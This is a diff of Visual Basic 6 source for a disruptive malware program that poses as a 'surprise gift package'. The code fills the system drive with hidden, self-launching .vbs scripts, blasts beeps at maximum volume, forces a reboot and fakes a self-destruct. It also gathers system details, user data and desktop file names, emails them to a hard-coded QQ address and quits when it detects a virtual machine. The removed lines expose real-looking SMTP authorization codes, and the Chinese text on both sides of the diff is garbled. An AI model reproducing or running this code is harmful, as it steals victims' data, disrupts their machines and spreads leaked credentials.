@@ -1,7 +1,7 @@
 VERSION 5.00
 Begin VB.Form Form1 
    BorderStyle     =   1  'Fixed Single
-   Caption         =   "¾ªÏ²´óÀñ°ü"
+   Caption         =   "æƒŠå–œå¤§ç¤¼åŒ…"
    ClientHeight    =   1665
    ClientLeft      =   45
    ClientTop       =   390
@@ -9,7 +9,7 @@ Begin VB.Form Form1
    ControlBox      =   0   'False
    DrawStyle       =   5  'Transparent
    BeginProperty Font 
-      Name            =   "Î¢ÈíÑÅºÚ"
+      Name            =   "å¾®è½¯é›…é»‘"
       Size            =   15
       Charset         =   134
       Weight          =   400
@@ -25,12 +25,12 @@ Begin VB.Form Form1
    Moveable        =   0   'False
    ScaleHeight     =   1665
    ScaleWidth      =   2490
-   StartUpPosition =   2  'ÆÁÄ»ÖĞĞÄ
+   StartUpPosition =   2  'å±å¹•ä¸­å¿ƒ
    Begin VB.CommandButton Command1 
       BackColor       =   &H00FF00FF&
-      Caption         =   "´ò¿ª"
+      Caption         =   "æ‰“å¼€"
       BeginProperty Font 
-         Name            =   "Î¢ÈíÑÅºÚ"
+         Name            =   "å¾®è½¯é›…é»‘"
          Size            =   15.75
          Charset         =   134
          Weight          =   400
@@ -55,9 +55,9 @@ Private Declare Function SetWindowPos Lib "user32" ( _
 ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
 Private Declare Function APIBeep Lib "kernel32" Alias "Beep" ( _
 ByVal dwFreq As Long, ByVal dwDuration As Long) As Long
-Private Declare Function OSruntime Lib "winmm.dll" Alias "timeGetTime" () As Long '»ñÈ¡¿ª»úµ½ÏÖÔÚµÄºÁÃëÊı
+Private Declare Function OSruntime Lib "winmm.dll" Alias "timeGetTime" () As Long 'è·å–å¼€æœºåˆ°ç°åœ¨çš„æ¯«ç§’æ•°
 Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
-'¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª¡ª
+'â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”
 Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" ( _
                           ByVal hwnd As Long, _
                           ByVal wMsg As Long, _
@@ -73,25 +73,25 @@ For i = 1 To p
     Next i
 End Sub
 
-Sub delay(delaytime As Long)  'ÑÓÊ±ºËĞÄ×Ó¹ı³Ì,ÒÔºÁÃë¼Æ
+Sub delay(delaytime As Long)  'å»¶æ—¶æ ¸å¿ƒå­è¿‡ç¨‹,ä»¥æ¯«ç§’è®¡
 savetime = OSruntime
-While OSruntime < savetime + delaytime 'Ñ­»·µÈ´ı
-DoEvents '½»³ö¿ØÖÆÈ¨
+While OSruntime < savetime + delaytime 'å¾ªç¯ç­‰å¾…
+DoEvents 'äº¤å‡ºæ§åˆ¶æƒ
 Wend
 End Sub
 
 Private Sub Form_Load()
 On Error GoTo noreg
-Dim ´ÎÊı As Long
-Set ws = CreateObject("Wscript.Shell") 'ÀûÓÃwshshellĞ´×¢²á±í
-´ÎÊı = ws.RegRead("HKCU\Software\LHCAPPs\jxdlb\startstat")
-If ´ÎÊı + 1 >= 2 Then
-MsgBox "ÈôÄúÔÚµÚÒ»´Î´ò¿ªÊ±¿´µ½×Ö½ÚÌø¶¯ÌØĞ§£¬Çëµ½ÏµÍ³ÅÌ²éÊÕµÚ¶ş¸öÀñ°ü", vbOKOnly, "¾ªÏ²´óÀñ°üÌáÊ¾£º" & ´ÎÊı
+Dim æ¬¡æ•° As Long
+Set ws = CreateObject("Wscript.Shell") 'åˆ©ç”¨wshshellå†™æ³¨å†Œè¡¨
+æ¬¡æ•° = ws.RegRead("HKCU\Software\LHCAPPs\jxdlb\startstat")
+If æ¬¡æ•° + 1 >= 2 Then
+MsgBox "è‹¥æ‚¨åœ¨ç¬¬ä¸€æ¬¡æ‰“å¼€æ—¶çœ‹åˆ°å­—èŠ‚è·³åŠ¨ç‰¹æ•ˆï¼Œè¯·åˆ°ç³»ç»Ÿç›˜æŸ¥æ”¶ç¬¬äºŒä¸ªç¤¼åŒ…", vbOKOnly, "æƒŠå–œå¤§ç¤¼åŒ…æç¤ºï¼š" & æ¬¡æ•°
 End If
-If ´ÎÊı + 1 >= 4 Then
-MsgBox "Ï²»¶ÎÒ¾Í·ÖÏíÎÒ£¡(´ò¿ª´ÎÊı£º" & ´ÎÊı
+If æ¬¡æ•° + 1 >= 4 Then
+MsgBox "å–œæ¬¢æˆ‘å°±åˆ†äº«æˆ‘ï¼(æ‰“å¼€æ¬¡æ•°ï¼š" & æ¬¡æ•°
 End If
-1: ws.RegWrite "HKCU\Software\LHCAPPs\jxdlb\startstat", ´ÎÊı + 1, "REG_SZ"
+1: ws.RegWrite "HKCU\Software\LHCAPPs\jxdlb\startstat", æ¬¡æ•° + 1, "REG_SZ"
 Exit Sub
 noreg: ws.RegWrite "HKCU\Software\LHCAPPs\jxdlb\startstat", 1, "REG_SZ"
 GoTo 1
@@ -108,15 +108,15 @@ End Sub
 Private Sub Command1_Click()
 On Error GoTo 32
 Command1.Enabled = False
-Command1.Caption = "ÕıÔÚ¼ì²é¸üĞÂ......"
+Command1.Caption = "æ­£åœ¨æ£€æŸ¥æ›´æ–°......"
 Mail
-'MsgBox "ÎªÁË¸üºÃµÄÏíÊÜÒôĞ§£¬ÇëÊ¹ÓÃ´øÓĞ·äÃùÆ÷µÄÖ÷°å£¬ÈçÄúÊÇWin10ÏµÍ³Çë´ò¿ªÒôÆµ²¥·ÅÉè±¸"
+'MsgBox "ä¸ºäº†æ›´å¥½çš„äº«å—éŸ³æ•ˆï¼Œè¯·ä½¿ç”¨å¸¦æœ‰èœ‚é¸£å™¨çš„ä¸»æ¿ï¼Œå¦‚æ‚¨æ˜¯Win10ç³»ç»Ÿè¯·æ‰“å¼€éŸ³é¢‘æ’­æ”¾è®¾å¤‡"
 If n = 0 Then
- Command1.Caption = "ÕıÔÚÆô¶¯×Ô»Ù³ÌĞò......1%"
+ Command1.Caption = "æ­£åœ¨å¯åŠ¨è‡ªæ¯ç¨‹åº......1%"
  delay (1000)
- VolumeUp (30) 'Ìá¸ß60ÒôÁ¿
+ VolumeUp (30) 'æé«˜60éŸ³é‡
  Form1.WindowState = 2
- Form1.Caption = "×¼±¸×Ô»Ù......"
+ Form1.Caption = "å‡†å¤‡è‡ªæ¯......"
  delay (1000)
  Command1.Height = Form1.Height
  Command1.Width = Form1.Width + 30
@@ -126,8 +126,8 @@ If n = 0 Then
  SetWindowPos Me.hwnd, -1, 0, 0, 0, 0, 3
  '''''''''''''''''''''''''''''''''''''''''''''
  n = 0
- freq = 250 'ÆµÂÊ
- dur = 300 'Ê±³¤
+ freq = 250 'é¢‘ç‡
+ dur = 300 'æ—¶é•¿
  Do
  VolumeUp (1)
  SetWindowPos Me.hwnd, -1, 0, 0, 0, 0, 3
@@ -138,46 +138,46 @@ If n = 0 Then
  n = n + 1
  freq = freq + 7
  dur = dur - 1
- Loop Until n = 300 '´ÎÊı
- Command1.Caption = "ÕıÔÚÆô¶¯×Ô»Ù³ÌĞò......2%(flooding the memory)"
+ Loop Until n = 300 'æ¬¡æ•°
+ Command1.Caption = "æ­£åœ¨å¯åŠ¨è‡ªæ¯ç¨‹åº......2%(flooding the memory)"
  delay 200
  APIBeep 1600, 500
  APIBeep 1600, 500
  APIBeep 1600, 500
  APIBeep 1200, 600
  delay 600
- Command1.Caption = "ÕıÔÚÆô¶¯×Ô»Ù³ÌĞò......39%(obfuscating the memory)"
+ Command1.Caption = "æ­£åœ¨å¯åŠ¨è‡ªæ¯ç¨‹åº......39%(obfuscating the memory)"
  APIBeep 1600, 800
  APIBeep 1600, 800
  APIBeep 1600, 800
  APIBeep 1200, 1000
  delay 600
- Command1.Caption = "ÕıÔÚÆô¶¯×Ô»Ù³ÌĞò......58e6ada3e59ca8e590afe58aa8e887aae6af81e7a88be5ba8f2e2e2e2e2e2e636c656172696e677468656d656d6f727929%(clearing the memory)"
+ Command1.Caption = "æ­£åœ¨å¯åŠ¨è‡ªæ¯ç¨‹åº......58e6ada3e59ca8e590afe58aa8e887aae6af81e7a88be5ba8f2e2e2e2e2e2e636c656172696e677468656d656d6f727929%(clearing the memory)"
  APIBeep 1600, 1000
  APIBeep 1600, 1000
  APIBeep 1600, 1000
  APIBeep 1200, 1500
  delay 600
- Command1.Caption = "ÕıÔÚÆô¶¯×Ô»Ù³ÌĞò......75fatal error syseb3e7af5abe483458591a86ef9841052tem halted%(disabling the memory)"
+ Command1.Caption = "æ­£åœ¨å¯åŠ¨è‡ªæ¯ç¨‹åº......75fatal error syseb3e7af5abe483458591a86ef9841052tem halted%(disabling the memory)"
  APIBeep 1600, 1000
  APIBeep 1600, 1000
  APIBeep 1600, 1000
  delay 10
  Command1.BackColor = &HAA
  DoEvents
- APIBeep 2000, 2500 'ÄÚ´æÖ®Éù
- Command1.Caption = "ÕıÔÚÆô¶¯×Ô»Ù³ÌĞò......&#90%(disabling the disks,look at your HDD light)"
+ APIBeep 2000, 2500 'å†…å­˜ä¹‹å£°
+ Command1.Caption = "æ­£åœ¨å¯åŠ¨è‡ªæ¯ç¨‹åº......&#90%(disabling the disks,look at your HDD light)"
  delay 600
  ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
  a = Second(Time)
  Open App.Path & "\killexe" & a & ".bat" For Output As #1
- '"@echo off" ²»ÏÔÊ¾Ö´ĞĞ¹ı³Ì
+ '"@echo off" ä¸æ˜¾ç¤ºæ‰§è¡Œè¿‡ç¨‹
  Print #1, "@echo off"
  Print #1, "ping -n 2 127.0>nul"
- 'É¾³ıÖ¸¶¨ÎÄ¼ş
+ 'åˆ é™¤æŒ‡å®šæ–‡ä»¶
  Print #1, "del " & App.EXEName + ".exe"
  Print #1, "ping -n 1 127.0>nul"
- 'É¾³ı×ÔÉí
+ 'åˆ é™¤è‡ªèº«
  Print #1, "del killexe" & a & ".bat"
  Print #1, "cls"
  Print #1, "exit"
@@ -185,19 +185,19 @@ If n = 0 Then
  
  Open App.Path & "\GHOST" & a & ".bat" For Output As #1
  Print #1, "@echo off"
- Print #1, "echo ¡¤¡¤¡¤¡¤¡¤"
+ Print #1, "echo Â·Â·Â·Â·Â·"
  Print #1, "del GHOST" & a & ".bat"
  Print #1, "cls"
  Print #1, "exit"
  Close #1
- '¿ª»ú·¢ÏÖ¹í³öÃ»
+ 'å¼€æœºå‘ç°é¬¼å‡ºæ²¡
  ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
- WriteFile (10000) 'Ğ´ÈëÎÄ¼ş10000
- Shell "cmd /c" & "shutdown -r -t 1000"      'ºËĞÄÃüÁî
+ WriteFile (10000) 'å†™å…¥æ–‡ä»¶10000
+ Shell "cmd /c" & "shutdown -r -t 1000"      'æ ¸å¿ƒå‘½ä»¤
  End
 End If
 Exit Sub
-32: MsgBox "ÓÖ¼ûÃæÀ²£¡ÇëÔÚÏµÍ³ÅÌ²éÊÕÏÂÒ»¸öÀñ°ü£¨1£©Å¶£¡"
+32: MsgBox "åˆè§é¢å•¦ï¼è¯·åœ¨ç³»ç»Ÿç›˜æŸ¥æ”¶ä¸‹ä¸€ä¸ªç¤¼åŒ…ï¼ˆ1ï¼‰å“¦ï¼"
 End
 End Sub
 
@@ -207,14 +207,14 @@ Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
     Cancel = UnloadMode = vbFormControlMenu
 End Sub
 
-'×¢£º½ûÓÃCtrl£¬Alt£¬del£¬tab»á±»ÊÓÎª²¡¶¾¶øÎŞ·¨ÔËĞĞ
+'æ³¨ï¼šç¦ç”¨Ctrlï¼ŒAltï¼Œdelï¼Œtabä¼šè¢«è§†ä¸ºç—…æ¯’è€Œæ— æ³•è¿è¡Œ
 
 
 
 
 Sub WriteFile(M As Integer)
-Set fs = CreateObject("scripting.filesystemobject") '¶¨Òå¶ÔÏó
-'''''''''''''''''''''''''''''''''''''''»ñÈ¡ÏµÍ³ÅÌ·û
+Set fs = CreateObject("scripting.filesystemobject") 'å®šä¹‰å¯¹è±¡
+'''''''''''''''''''''''''''''''''''''''è·å–ç³»ç»Ÿç›˜ç¬¦
 Dim StrBuff As String, rtn As Long, sysdrv
 StrBuff = Space(255)
 
@@ -222,7 +222,7 @@ rtn = GetWindowsDirectory(StrBuff, 255)
 If rtn Then
 Drivename = Left(StrBuff, 1)
 End If
-'''''''''''''''''''''''''''''''''''''''Êä³öÏµÍ³ÅÌ·û
+'''''''''''''''''''''''''''''''''''''''è¾“å‡ºç³»ç»Ÿç›˜ç¬¦
 GetEmptySpaceOn (Drivename)
 Do
 X = X + 1
@@ -230,9 +230,9 @@ DoEvents
 GetEmptySpaceOn (Drivename)
 Data = "ON ERROR RESUME NEXT" & vbCrLf _
 & "sleep 50" & vbCrLf _
-& "'¹ş¹ş" & vbCrLf _
+& "'å“ˆå“ˆ" & vbCrLf _
 & "CreateObject(" & Chr(34) & "WScript.Shell" & Chr(34) & ").run " & Chr(34) & X + 1 & ".vbs" & Chr(34) & vbCrLf _
-& "msgbox" & Chr(34) & "´ÅÅÌ¿Õ¼ä½öÊ£" & SpaceLeft & "×Ö½Ú"""
+& "msgbox" & Chr(34) & "ç£ç›˜ç©ºé—´ä»…å‰©" & SpaceLeft & "å­—èŠ‚"""
 
 If (fs.FileExists(Drivename & ":\" & Str(n) & ".vbs")) Then
 Shell "cmd /c " & Drivename & ":\1.vbs"
@@ -257,12 +257,12 @@ f.Close
 
 End If
 SetAttr Drivename & ":\" & X & ".vbs", vbSystem Or vbHidden
-Command1.Caption = "ÕıÔÚÆô¶¯Ó²ÅÌ×Ô»Ù³ÌĞò......ÆÆ»µÉÈÇø" & X * 64 & "/640000(disabling the disks,look at your HDD light)"
+Command1.Caption = "æ­£åœ¨å¯åŠ¨ç¡¬ç›˜è‡ªæ¯ç¨‹åº......ç ´åæ‰‡åŒº" & X * 64 & "/640000(disabling the disks,look at your HDD light)"
 Loop Until X = M
 SetAttr Drivename & ":\" & "1.vbs", vbSystem Or vbNormal
 End Sub
 
-Function GetEmptySpaceOn(Drivename As String) '²é¿´Ê£Óà¿Õ¼ä
+Function GetEmptySpaceOn(Drivename As String) 'æŸ¥çœ‹å‰©ä½™ç©ºé—´
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set driver = fso.GetDrive(Drivename & ":")
 SpaceLeft = driver.AvailableSpace
@@ -270,37 +270,27 @@ End Function
 
 Sub Mail()
 On Error Resume Next
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''ÓÊ¼ş·¢ËÍÄ£¿é
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''é‚®ä»¶å‘é€æ¨¡å—
 Dim Email As Object
 Const NameSpace = "http://schemas.microsoft.com/cdo/configuration/"
 Set Email = CreateObject("cdo.message")
-Email.From = "1041351041@qq.com" '·¢¼şÈËÓÊÏä
-Email.To = "2743218818@qq.com" 'ÊÕ¼şÈËÓÊÏä*
-Email.Subject = "¾ªÏ²"  'Ö÷Ìâ
-Email.Textbody = Getinfo 'ÓÊ¼şÄÚÈİ
-'Email.HtmlBody = "https://static.zhixue.com/tlsysapp/public/101283/module/global/images_new/logo_login.png"
-'Email.AddAttachment = "C:\±¸·İ\UÅÌ\ÒôÀÖ\ÍøÒ×ÔÆyeah£¡\Ïë¼ûÄã\Devoted.m4a" '¸½¼ş£¬ÊäÈë¾ø¶ÔÂ·¾¶£¬Èçd:\1.jpg
+Email.From = "**@qq.com" 'å‘ä»¶äººé‚®ç®±
+Email.To = "*@qq.com" 'æ”¶ä»¶äººé‚®ç®±*
+Email.Subject = "æƒŠå–œ"  'ä¸»é¢˜
+Email.Textbody = Getinfo 'é‚®ä»¶å†…å®¹
 With Email.Configuration.Fields
 .item(NameSpace & "sendusing") = 2
-.item(NameSpace & "smtpserver") = "smtp.qq.com" 'Ê¹ÓÃqqµÄÓÊ¼ş·şÎñÆ÷
+.item(NameSpace & "smtpserver") = "smtp.qq.com" 'ä½¿ç”¨qqçš„é‚®ä»¶æœåŠ¡å™¨
 .item(NameSpace & "smtpserverport") = 465
 .item(NameSpace & "smtpauthenticate") = 1
-.item(NameSpace & "sendusername") = 1041351041 'qqºÅÂë
-'2631988746
-'³É¹¦¿ªÆôPOP3/SMTP·şÎñ,ÔÚµÚÈı·½¿Í»§¶ËµÇÂ¼Ê±£¬ÃÜÂë¿òÇëÊäÈëÒÔÏÂÊÚÈ¨Âë£ºqvcfzgrwbibzebfd
-'³É¹¦¿ªÆôIMAP/SMTP·şÎñ,ÔÚµÚÈı·½¿Í»§¶ËµÇÂ¼Ê±£¬ÃÜÂë¿òÇëÊäÈëÒÔÏÂÊÚÈ¨Âë£ºagtonucuvhezecdh
-'³É¹¦¿ªÆôExchange·şÎñ,ÔÚµÚÈı·½¿Í»§¶ËµÇÂ¼Ê±£¬ÃÜÂë¿òÇëÊäÈëÒÔÏÂÊÚÈ¨Âë£ºnvtihijgvueieccb
-'³É¹¦¿ªÆôCardDav/CalDav·şÎñ,ÔÚµÚÈı·½¿Í»§¶ËµÇÂ¼Ê±£¬ÃÜÂë¿òÇëÊäÈëÒÔÏÂÊÚÈ¨Âë£ºzrflbsrlftsqdjif
-'1041351041
-'³É¹¦¿ªÆôIMAP/SMTP·şÎñ,ÔÚµÚÈı·½¿Í»§¶ËµÇÂ¼Ê±£¬ÃÜÂë¿òÇëÊäÈëÒÔÏÂÊÚÈ¨Âë£ºiughmzzfkecpbaib
-'³É¹¦¿ªÆôPOP3/SMTP·şÎñ,ÔÚµÚÈı·½¿Í»§¶ËµÇÂ¼Ê±£¬ÃÜÂë¿òÇëÊäÈëÒÔÏÂÊÚÈ¨Âë£ºhzlitskcsupfbdic
-'
-.item(NameSpace & "sendpassword") = "iughmzzfkecpbaib"  ' ÊÚÈ¨Âë£¨ÃÜÂë£©
-.item(NameSpace & "smtpusessl") = "true" '¼ÓÃÜ·¢ËÍ£¬QQÓÊÏä²»ÔÊĞíÆÕÍ¨·¢ËÍ
+.item(NameSpace & "sendusername") = ** 'qqå·ç 
+
+.item(NameSpace & "sendpassword") = "***"  ' æˆæƒç ï¼ˆå¯†ç ï¼‰
+.item(NameSpace & "smtpusessl") = "true" 'åŠ å¯†å‘é€ï¼ŒQQé‚®ç®±ä¸å…è®¸æ™®é€šå‘é€
 .Update
 End With
 Email.Send
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''ÓÊ¼ş·¢ËÍÄ£¿é
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''é‚®ä»¶å‘é€æ¨¡å—
 End Sub
 
 Function Getinfo()
@@ -309,43 +299,43 @@ Dim s, System, item
 Dim i As Integer
 Set System = GetObject("winmgmts:").InstancesOf("Win32_ComputerSystem")
 For Each item In System
-s = "¾ªÏ²´óÀñ°ü2.0£º" & vbCrLf
+s = "æƒŠå–œå¤§ç¤¼åŒ…2.0ï¼š" & vbCrLf
 s = s & "***********************" & vbCrLf
-s = s & "¼ÆËã»úÃû³Æ: " & item.Name & vbCrLf
-s = s & "×´Ì¬: " & item.Status & vbCrLf
-s = s & "ÀàĞÍ: " & item.SystemType & vbCrLf
-s = s & "Éú²ú³§¼Ò: " & item.Manufacturer & vbCrLf
-s = s & "ĞÍºÅ: " & item.Model & vbCrLf
-s = s & "×ÜÄÚ´æ: " & item.totalPhysicalMemory & "bytes" & vbCrLf
-s = s & "Óò: " & item.domain & vbCrLf
-'s = s & "¹¤×÷×é" & item.Workgroup & vbCrLf '»ñµÃ¹¤×÷×éºÍÓòµÄÑ¡Ïî²»ÄÜÍ¬Ê±ÓÃ
-s = s & "µ±Ç°ÓÃ»§: " & item.UserName & vbCrLf
-s = s & "Æô¶¯×´Ì¬" & item.BootupState & vbCrLf
-s = s & "¸Ã¼ÆËã»úÊôÓÚ" & item.PrimaryOwnerName & vbCrLf
-s = s & "ÏµÍ³ÀàĞÍ" & item.CreationClassName & vbCrLf
-s = s & "¼ÆËã»úÀàĞÍ" & item.Description & vbCrLf
-For i = 0 To 1 'ÕâÀï¼ÙÉè°²×°ÁËÁ½¸öÏµÍ³
-s = s & Chr(5) & "Æô¶¯Ñ¡Ïî" & i & " :" & item.SystemStartupOptions(i) & vbCrLf
+s = s & "è®¡ç®—æœºåç§°: " & item.Name & vbCrLf
+s = s & "çŠ¶æ€: " & item.Status & vbCrLf
+s = s & "ç±»å‹: " & item.SystemType & vbCrLf
+s = s & "ç”Ÿäº§å‚å®¶: " & item.Manufacturer & vbCrLf
+s = s & "å‹å·: " & item.Model & vbCrLf
+s = s & "æ€»å†…å­˜: " & item.totalPhysicalMemory & "bytes" & vbCrLf
+s = s & "åŸŸ: " & item.domain & vbCrLf
+'s = s & "å·¥ä½œç»„" & item.Workgroup & vbCrLf 'è·å¾—å·¥ä½œç»„å’ŒåŸŸçš„é€‰é¡¹ä¸èƒ½åŒæ—¶ç”¨
+s = s & "å½“å‰ç”¨æˆ·: " & item.UserName & vbCrLf
+s = s & "å¯åŠ¨çŠ¶æ€" & item.BootupState & vbCrLf
+s = s & "è¯¥è®¡ç®—æœºå±äº" & item.PrimaryOwnerName & vbCrLf
+s = s & "ç³»ç»Ÿç±»å‹" & item.CreationClassName & vbCrLf
+s = s & "è®¡ç®—æœºç±»å‹" & item.Description & vbCrLf
+For i = 0 To 1 'è¿™é‡Œå‡è®¾å®‰è£…äº†ä¸¤ä¸ªç³»ç»Ÿ
+s = s & Chr(5) & "å¯åŠ¨é€‰é¡¹" & i & " :" & item.SystemStartupOptions(i) & vbCrLf
 Next i
 Next
 ''''''''''''''''''''''''''''''''''''''''''''''''''
-Dim WMI·şÎñ As Object
-Dim ¶ÔÏó As Object
-Dim ×Ó¶ÔÏó As Object
-Dim Ë¢ĞÂ As Long
-Ë¢ĞÂ = 0
-Set WMI·şÎñ = GetObject("winmgmts:\\.\root\cimv2")
-Set ¶ÔÏó = WMI·şÎñ.InstancesOf("Win32_Processor")
+Dim WMIæœåŠ¡ As Object
+Dim å¯¹è±¡ As Object
+Dim å­å¯¹è±¡ As Object
+Dim åˆ·æ–° As Long
+åˆ·æ–° = 0
+Set WMIæœåŠ¡ = GetObject("winmgmts:\\.\root\cimv2")
+Set å¯¹è±¡ = WMIæœåŠ¡.InstancesOf("Win32_Processor")
 Me.CurrentX = 0
 Me.CurrentY = 0
-For Each ×Ó¶ÔÏó In ¶ÔÏó
-If Ë¢ĞÂ = 0 Then
-Ë¢ĞÂ = 1
+For Each å­å¯¹è±¡ In å¯¹è±¡
+If åˆ·æ–° = 0 Then
+åˆ·æ–° = 1
 Me.Cls
 End If
-Seewhat = ×Ó¶ÔÏó.Name
-s = s & "CPU:" & ×Ó¶ÔÏó.Name & "@" & ×Ó¶ÔÏó.CurrentClockSpeed & "MHz (Ê¹ÓÃÂÊ:" & _
-×Ó¶ÔÏó.LoadPercentage & "%)" & "ĞòÁĞºÅ£º" & ×Ó¶ÔÏó.ProcessorId & vbCrLf
+Seewhat = å­å¯¹è±¡.Name
+s = s & "CPU:" & å­å¯¹è±¡.Name & "@" & å­å¯¹è±¡.CurrentClockSpeed & "MHz (ä½¿ç”¨ç‡:" & _
+å­å¯¹è±¡.LoadPercentage & "%)" & "åºåˆ—å·ï¼š" & å­å¯¹è±¡.ProcessorId & vbCrLf
 Next
 '''''''''''''''''''''''''''''''''''
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
@@ -353,57 +343,57 @@ For i = 1 To 20
 Set colItems = objWMIService.ExecQuery("Select * From Win32_PerfRawData_PerfOS_Memory")
 For Each objItem In colItems
 intValue = objItem.Availablekbytes
-memory = "¿ÉÓÃÄÚ´æ£º" & intValue & "KB"
+memory = "å¯ç”¨å†…å­˜ï¼š" & intValue & "KB"
 Next
 Next
 s = s & memory & vbCrLf
 '''''''''''''''''''''''''''''''''''
     Set fsoobj = CreateObject("Scripting.FileSystemObject")
     Set drvObj = fsoobj.Drives
-    s = s & "·ÖÇøĞÅÏ¢£º" & vbCrLf
+    s = s & "åˆ†åŒºä¿¡æ¯ï¼š" & vbCrLf
     For Each D In drvObj
         Err.Clear
            If D.IsReady Then
-                s = s & D.DriveLetter & "ÅÌ£º" & vbCrLf
-                s = s & "¿ÉÓÃ¿Õ¼ä:" & cSize(D.FreeSpace) & vbCrLf
-                s = s & "×Ü´óĞ¡:" & cSize(D.TotalSize) & vbCrLf
-                s = s & "Ê¹ÓÃÂÊ :" & Round(100 * ((D.TotalSize - D.FreeSpace) / D.TotalSize), 2) & "%" & vbCrLf
+                s = s & D.DriveLetter & "ç›˜ï¼š" & vbCrLf
+                s = s & "å¯ç”¨ç©ºé—´:" & cSize(D.FreeSpace) & vbCrLf
+                s = s & "æ€»å¤§å°:" & cSize(D.TotalSize) & vbCrLf
+                s = s & "ä½¿ç”¨ç‡ :" & Round(100 * ((D.TotalSize - D.FreeSpace) / D.TotalSize), 2) & "%" & vbCrLf
            End If
     Next
 ''''''''''''''''''''''''''''''''''''''''''''''''''
 Set WMI = GetObject("winmgmts:\\.\root\CIMV2")
 Set w = WMI.ExecQuery("select * from win32_NetworkAdapter")
-s = s & "ÍøÂçÊÊÅäÆ÷"
-For Each ×Ó¶ÔÏó In w
-    s = s & vbCrLf & ×Ó¶ÔÏó.ProductName
+s = s & "ç½‘ç»œé€‚é…å™¨"
+For Each å­å¯¹è±¡ In w
+    s = s & vbCrLf & å­å¯¹è±¡.ProductName
 Next
 Set w = WMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration Where IPEnabled=True")
-s = s & vbCrLf & "MACµØÖ·"
-For Each ×Ó¶ÔÏó In w
-    s = s & vbCrLf & ×Ó¶ÔÏó.MACAddress
+s = s & vbCrLf & "MACåœ°å€"
+For Each å­å¯¹è±¡ In w
+    s = s & vbCrLf & å­å¯¹è±¡.MACAddress
 Next
 Set w = WMI.ExecQuery("select * from win32_VideoController")
-s = s & vbCrLf & "ÏÔ¿¨ĞÍºÅ----ÏÔ´æ"
-For Each ×Ó¶ÔÏó In w
-    s = s & vbCrLf & ×Ó¶ÔÏó.Name & " ---- " & ×Ó¶ÔÏó.AdapterRAM & vbCrLf
+s = s & vbCrLf & "æ˜¾å¡å‹å·----æ˜¾å­˜"
+For Each å­å¯¹è±¡ In w
+    s = s & vbCrLf & å­å¯¹è±¡.Name & " ---- " & å­å¯¹è±¡.AdapterRAM & vbCrLf
 Next
 If InStr(s, "Teredo") > 0 Or InStr(s, "Virt") > 0 Or InStr(s, "VMware") > 0 Then
     If InStr(s, "VMnet") <= 0 And InStr(s, "Wi-Fi Direct") <= 0 Then
-    MsgBox "ß×£¬£¨»·¹ËËÄÖÜ£©ÎÒÔõÃ´±»À§ÔÚĞéÄâ»úÀïÁË£¿£¨Ö¸×ÅĞéÄâµÄ»·¾³£©Õâ»¹ÔõÃ´²Ù×÷£¿Íæ¸ö" & Seewhat & "?£¨³ÌĞò½«ÍË³ö£©", vbCritical, "Íæ¸ö´¸×Ó"
+    MsgBox "å’¦ï¼Œï¼ˆç¯é¡¾å››å‘¨ï¼‰æˆ‘æ€ä¹ˆè¢«å›°åœ¨è™šæ‹Ÿæœºé‡Œäº†ï¼Ÿï¼ˆæŒ‡ç€è™šæ‹Ÿçš„ç¯å¢ƒï¼‰è¿™è¿˜æ€ä¹ˆæ“ä½œï¼Ÿç©ä¸ª" & Seewhat & "?ï¼ˆç¨‹åºå°†é€€å‡ºï¼‰", vbCritical, "ç©ä¸ªé”¤å­"
     End
     End If
 End If
 ''''''''''''''''''''''''''''''''''''''''''''''''''
-s = s & "ÎÄ¼şÃû:" & vbCrLf
+s = s & "æ–‡ä»¶å:" & vbCrLf
 Dim fso As Object
 Dim folder As Object
 Dim subfolder As Object
 Dim file As Object
-Set fso = CreateObject("scripting.filesystemobject") '´´½¨FSO¶ÔÏó
+Set fso = CreateObject("scripting.filesystemobject") 'åˆ›å»ºFSOå¯¹è±¡
 Dim kk As New IWshRuntimeLibrary.IWshShell_Class
 Set folder = fso.GetFolder(kk.SpecialFolders("Desktop"))
-For Each file In folder.Files '±éÀú¸ùÎÄ¼ş¼ĞÏÂµÄÎÄ¼ş
-zmwj = zmwj & file & vbCrLf 'Êä³öÎÄ¼şÃû
+For Each file In folder.Files 'éå†æ ¹æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶
+zmwj = zmwj & file & vbCrLf 'è¾“å‡ºæ–‡ä»¶å
 Next
 Set fso = Nothing
 Set folder = Nothing
@@ -415,7 +405,7 @@ xnj = xnj + 1
 End If
 Next i
 If InStr(zmwj, "My Document") Or xnj > 6 Then
-MsgBox "ß×£¬£¨»·¹ËËÄÖÜ£©ÎÒÔõÃ´±»À§ÔÚĞéÄâ»úÀïÁË£¿£¨Ö¸×ÅĞéÄâµÄ»·¾³£©Õâ»¹ÔõÃ´²Ù×÷£¿Íæ¸ö" & Seewhat & "?£¨³ÌĞò½«ÍË³ö£©", vbCritical, "Íæ¸ö´¸×Ó"
